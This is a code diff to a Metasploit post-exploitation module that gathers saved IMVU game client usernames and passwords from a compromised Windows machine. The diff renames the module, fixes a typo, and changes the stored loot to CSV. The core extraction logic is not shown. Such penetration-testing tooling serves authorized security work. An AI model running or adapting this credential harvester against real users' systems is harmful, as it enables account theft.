@@ -24,15 +24,14 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info = {})
 		super(update_info(info, 
-			'Name'           => 'IMVU Password Extractor',
+			'Name'           => 'Post Windows Gather Credentials IMVU Game Client',
 			'Description'    => %q{
-				This module extracts account Userame & password From IMVU Client and stores
-				it as loot.
+				This module extracts account username & password from the IMVU game client
+				and stores it as loot.
 				},
 			'Author'         =>
 				[
-				'Shubham Dawra <shubham2dawra[at]gmail.com>',
-				'SecurityXploded Team', #www.SecurityXploded.com
+				'Shubham Dawra <shubham2dawra[at]gmail.com>' # www.SecurityXploded.com
 				],
 			'License'        => MSF_LICENSE, 
 			'Version'        => '$Revision: 14100 $', 
@@ -46,7 +45,7 @@ class Metasploit3 < Msf::Post
 
 		creds = Rex::Ui::Text::Table.new(
 			'Header' => 'IMVU Credentials',
-			'Ident' => 1,
+			'Indent' => 1,
 			'Columns' =>[
 				'User',
 				'Password'
@@ -80,10 +79,10 @@ class Metasploit3 < Msf::Post
 			print_status("Storing data...")
 			path = store_loot(
 				'imvu.user.creds',
-				'text/plain',
+				'text/csv',
 				session,
-				creds,
-				'imvu_user_creds.txt',
+				creds.to_csv,
+				'imvu_user_creds.csv',
 				'IMVU User Credentials'
 			)
 
